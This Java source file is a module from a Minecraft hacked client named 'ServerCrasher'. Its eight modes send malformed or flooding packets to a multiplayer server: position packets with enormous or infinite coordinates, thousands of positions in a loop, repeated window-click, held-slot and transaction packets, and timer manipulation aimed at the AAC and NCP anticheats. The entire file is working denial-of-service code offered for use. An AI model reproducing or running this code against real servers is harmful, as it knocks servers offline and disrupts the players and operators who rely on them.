package dev.zenhao.melon.module.modules.misc;

import dev.zenhao.melon.module.Category;
import dev.zenhao.melon.module.Module;
import dev.zenhao.melon.setting.IntegerSetting;
import dev.zenhao.melon.setting.ModeSetting;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketConfirmTransaction;
import net.minecraft.network.play.client.CPacketHeldItemChange;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.util.EnumHand;
import org.apache.commons.lang3.RandomUtils;

@Module.Info(name = "ServerCrasher", category = Category.MISC)
public class ServerCrasher extends Module {
    public ModeSetting<?> crasherMode = msetting("Mode", CrashMode.AACOther);
    public IntegerSetting loopFactor = isetting("LoopFactor", 349, 1, 2000);

    @Override
    public void onEnable() {
        if (fullNullCheck()) {
            return;
        }
        try {
            if (crasherMode.getValue().equals(CrashMode.AACNew)) {
                int index = 0;
                while (index < 9999) {
                    mc.player.connection.sendPacket(new CPacketPlayer.Position(mc.player.posX + 9412 * index, mc.player.getEntityBoundingBox().minY + 9412 * index, mc.player.posZ + 9412 * index, true));
                    ++index;
                }
            } else if (crasherMode.getValue().equals(CrashMode.AACOther)) {
                int index = 0;
                while (index < 9999) {
                    mc.player.connection.sendPacket(new CPacketPlayer.Position(mc.player.posX + 500000 * index, mc.player.getEntityBoundingBox().minY + 500000 * index, mc.player.posZ + 500000 * index, true));
                    ++index;
                }
            } else if (crasherMode.getValue().equals(CrashMode.AACOld)) {
                mc.player.connection.sendPacket(new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
            } else if (crasherMode.getValue().equals(CrashMode.OldNCP)) {
                mc.timer.tickLength = 50f;
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void onDisable() {
        if (fullNullCheck()) {
            return;
        }
        if (crasherMode.getValue().equals(CrashMode.OldNCP)) {
            mc.timer.tickLength = 50f;
        }
    }

    @Override
    public void onUpdate() {
        if (fullNullCheck()) {
            return;
        }
        try {
            if (crasherMode.getValue().equals(CrashMode.AAC5)) {
                mc.player.connection.sendPacket(new CPacketPlayer.Position(1.7e+301, -999.0, 0.0, true));
            } else if (crasherMode.getValue().equals(CrashMode.ClickPacket)) {
                for (int j = 0; j < loopFactor.getValue(); ++j) {
                    ItemStack item = new ItemStack(mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
                    CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short) 1);
                    mc.player.connection.sendPacket(packet);
                }
            } else if (crasherMode.getValue().equals(CrashMode.OldNCP)) {
                mc.timer.tickLength = 22.5f / 50f;
                mc.player.connection.sendPacket(new CPacketPlayer.Position(RandomUtils.nextDouble(-1048576.0, 1048576.0), RandomUtils.nextDouble(-1048576.0, 1048576.0), RandomUtils.nextDouble(-1048576.0, 1048576.0), true));
                mc.player.connection.sendPacket(new CPacketPlayer.Position(RandomUtils.nextDouble(-65536.0, 65536.0), RandomUtils.nextDouble(-65536.0, 65536.0), RandomUtils.nextDouble(-65536.0, 65536.0), true));
            } else if (crasherMode.getValue().equals(CrashMode.HeldSlot)) {
                for (int j = 0; j < loopFactor.getValue(); ++j) {
                    CPacketHeldItemChange packet = new CPacketHeldItemChange(j);
                    mc.player.connection.sendPacket(packet);
                }
            } else if (crasherMode.getValue().equals(CrashMode.Transc)) {
                for (int j = 0; j < loopFactor.getValue(); ++j) {
                    CPacketConfirmTransaction packet = new CPacketConfirmTransaction(j, (short) 1, true);
                    mc.player.connection.sendPacket(packet);
                }
            }
        } catch (Exception ignored) {
        }
    }

    public enum CrashMode {
        AACOther,
        AACOld,
        AACNew,
        AAC5,
        OldNCP,
        ClickPacket,
        HeldSlot,
        Transc
    }
}
